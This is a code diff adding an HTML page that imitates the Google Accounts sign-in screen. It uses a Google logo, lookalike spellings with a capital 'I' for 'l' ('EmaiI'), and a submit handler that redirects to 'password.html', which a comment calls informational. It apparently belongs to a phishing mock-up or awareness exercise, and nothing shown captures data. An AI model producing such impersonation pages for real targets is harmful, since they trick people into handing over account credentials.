@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <link rel="stylesheet" href="test.css">
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById('login-form').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        // Redirect to an informational page
+        window.location.href = 'password.html';
+      });
+    });
+  </script>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="logo.png" alt="Google Logo">
+    </div>
+    <h1>Sign in</h1>
+    <form id="login-form" action="#">
+      <input type="email" class="input-field" placeholder="EmaiI or phone" required>
+      <a href="#" class="link">Forgot emaiI?</a>
+      <button type="submit" class="button">Next</button>
+    </form>
+    <a href="#" class="link">Create account</a>
+  </div>
+</body>
+</html>
